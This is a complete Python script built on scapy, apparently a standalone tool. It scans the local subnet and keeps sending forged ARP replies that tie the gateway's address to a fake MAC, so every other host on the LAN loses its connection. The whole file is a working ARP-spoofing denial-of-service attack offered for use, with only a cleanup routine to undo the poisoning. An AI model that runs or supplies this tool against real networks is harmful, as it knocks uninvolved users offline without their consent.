import argparse
import platform
import subprocess
import sys
import time
import logging
import random
import re
import signal
from typing import List, Optional
from scapy.all import (
    Ether,
    ARP,
    sendp,
    get_if_list,
    get_working_if,
    srp,
    get_if_addr
)

class NetworkError(Exception):
    """Base exception for network-related errors."""
    pass

class GatewayDetectionError(NetworkError):
    """Exception raised when unable to detect the gateway."""
    pass

class InvalidMACError(ValueError):
    """Exception raised when an invalid MAC address is provided."""
    pass

class NetworkDisruptor:
    def __init__(self, fake_mac: Optional[str] = None, gateway_ip: Optional[str] = None, interface: Optional[str] = None):
        # Set up signal handling for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        
        # Configure logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Initialize network interface
        self.interface = self._validate_interface(interface)
        
        # Validate and set MAC address
        self.fake_mac = self._validate_mac(fake_mac) if fake_mac else self._generate_random_mac()
        
        # Set gateway IP
        self.gateway_ip = self._validate_ip(gateway_ip) if gateway_ip else self._get_default_gateway()
        
        self.os_type = platform.system().lower()
        self.running = False
        self.targets = set()  # Keep track of affected targets for cleanup

    def _validate_interface(self, interface: Optional[str]) -> str:
        """Validate the network interface."""
        available_interfaces = get_if_list()
        if interface:
            if interface not in available_interfaces:
                raise NetworkError(f"Interface {interface} not found. Available interfaces: {', '.join(available_interfaces)}")
            return interface
        return get_working_if()

    def _validate_mac(self, mac: str) -> str:
        """Validate MAC address format."""
        mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        if not mac_pattern.match(mac):
            raise InvalidMACError("Invalid MAC address format. Expected format: XX:XX:XX:XX:XX:XX")
        return mac.lower()

    def _validate_ip(self, ip: str) -> str:
        """Validate IP address format."""
        ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
        if not ip_pattern.match(ip):
            raise ValueError("Invalid IP address format. Expected format: XXX.XXX.XXX.XXX")
        # Validate each octet
        octets = ip.split('.')
        if not all(0 <= int(octet) <= 255 for octet in octets):
            raise ValueError("IP address octets must be between 0 and 255")
        return ip

    def _signal_handler(self, signum: int, frame) -> None:
        """Handle shutdown signals."""
        self.logger.info(f"Received signal {signum}")
        self.cleanup()
        sys.exit(0)

    def cleanup(self) -> None:
        """Clean up network disruption by sending correct ARP responses."""
        self.running = False
        self.logger.info("Starting cleanup...")
        
        try:
            # Get the actual MAC address of the gateway
            gateway_mac = self._get_real_gateway_mac()
            if gateway_mac:
                # Send correct ARP responses to all affected targets
                for target_ip in self.targets:
                    self._send_correction_arp(target_ip, gateway_mac)
                self.logger.info("Cleanup completed successfully")
            else:
                self.logger.error("Could not get gateway MAC address for cleanup")
        except Exception as e:
            self.logger.error(f"Error during cleanup: {str(e)}")

    def _get_real_gateway_mac(self) -> Optional[str]:
        """Get the real MAC address of the gateway."""
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=self.gateway_ip), 
                        timeout=2, verbose=False, iface=self.interface)
            if ans:
                return ans[0][1].hwsrc
            return None
        except Exception as e:
            self.logger.error(f"Error getting gateway MAC: {str(e)}")
            return None

    def _send_correction_arp(self, target_ip: str, real_gateway_mac: str) -> None:
        """Send a correction ARP packet with the real gateway MAC."""
        arp_correction = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.gateway_ip,
            hwsrc=real_gateway_mac
        )
        sendp(arp_correction, iface=self.interface, verbose=False)
        self.logger.info(f"Sent ARP correction to {target_ip}")

    def disrupt_network(self) -> None:
        """Send fake ARP responses to disrupt the network."""
        self.logger.info("Starting network disruption...")
        self.logger.info(f"Using fake MAC: {self.fake_mac}")
        self.logger.info(f"Targeting gateway IP: {self.gateway_ip}")
        
        self.running = True
        try:
            while self.running:
                targets = self._get_lan_targets()
                for target_ip in targets:
                    self._send_fake_arp(target_ip, self.fake_mac)
                    self.targets.add(target_ip)  # Track affected targets
                time.sleep(2)
        except KeyboardInterrupt:
            self.logger.info("Disruption stopped by user")
            self.cleanup()
        except Exception as e:
            self.logger.error(f"Disruption error: {str(e)}")
            self.cleanup()

    def _get_lan_targets(self) -> List[str]:
        """Discover all IP addresses on the LAN except the local machine."""
        self.logger.info("Scanning LAN for targets...")
        try:
            local_ip = get_if_addr(self.interface)
            
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=f"{local_ip}/24"),
                timeout=2,
                verbose=False,
                iface=self.interface
            )
            
            targets = [response[1].psrc for response in ans 
                      if response[1].psrc != local_ip 
                      and response[1].psrc != self.gateway_ip]
            
            self.logger.info(f"Found {len(targets)} targets on the LAN")
            return targets
            
        except OSError as e:
            self.logger.error(f"Network interface error: {str(e)}")
            return []
        except Exception as e:
            self.logger.error(f"Failed to scan LAN: {str(e)}")
            return []

    def _send_fake_arp(self, target_ip: str, fake_mac: str) -> None:
        """Send a fake ARP response to a target IP."""
        try:
            arp_response = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2,
                pdst=target_ip,
                hwdst=fake_mac,
                psrc=self.gateway_ip,
                hwsrc=fake_mac
            )
            sendp(arp_response, iface=self.interface, verbose=False)
            self.logger.info(f"Sent fake ARP response to {target_ip} with MAC {fake_mac}")
        except Exception as e:
            self.logger.error(f"Failed to send ARP to {target_ip}: {str(e)}")

    def _generate_random_mac(self) -> str:
        """Generate a random MAC address."""
        return "02:00:00:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def _get_default_gateway(self) -> str:
        """Determine the default gateway IP address."""
        try:
            if self.os_type == "windows":
                return self._get_windows_gateway()
            elif self.os_type in ("linux", "darwin"):
                return self._get_unix_gateway()
            else:
                raise GatewayDetectionError(f"Unsupported operating system: {self.os_type}")
        except Exception as e:
            raise GatewayDetectionError(f"Failed to determine default gateway: {str(e)}")

    def _get_windows_gateway(self) -> str:
        """Get default gateway on Windows systems."""
        try:
            result = subprocess.run(
                ["ipconfig"], 
                capture_output=True, 
                text=True, 
                check=True
            )
            for line in result.stdout.splitlines():
                if "Default Gateway" in line:
                    gateway = line.split(":")[-1].strip()
                    if self._validate_ip(gateway):
                        return gateway
            raise GatewayDetectionError("No valid gateway found in ipconfig output")
        except subprocess.CalledProcessError as e:
            raise GatewayDetectionError(f"Failed to run ipconfig: {str(e)}")

    def _get_unix_gateway(self) -> str:
        """Get default gateway on Unix-like systems."""
        try:
            result = subprocess.run(
                ["ip", "route"], 
                capture_output=True, 
                text=True, 
                check=True
            )
            for line in result.stdout.splitlines():
                if "default via" in line:
                    gateway = line.split()[2]
                    if self._validate_ip(gateway):
                        return gateway
            raise GatewayDetectionError("No valid gateway found in ip route output")
        except subprocess.CalledProcessError as e:
            raise GatewayDetectionError(f"Failed to run ip route: {str(e)}")

def main():
    parser = argparse.ArgumentParser(
        description="Cross-platform network disruption using ARP spoofing"
    )
    parser.add_argument(
        "--fake-mac",
        help="Fake MAC address to use in ARP responses (optional, random MAC will be generated if not provided)",
        default=None
    )
    parser.add_argument(
        "--gateway-ip",
        help="Gateway IP address (optional, will be auto-detected if not provided)",
        default=None
    )
    parser.add_argument(
        "--interface",
        help="Network interface to use (optional)",
        default=None
    )
    
    args = parser.parse_args()
    
    try:
        disruptor = NetworkDisruptor(
            fake_mac=args.fake_mac,
            gateway_ip=args.gateway_ip,
            interface=args.interface
        )
        disruptor.disrupt_network()
    except (NetworkError, ValueError) as e:
        logging.error(f"Configuration error: {str(e)}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
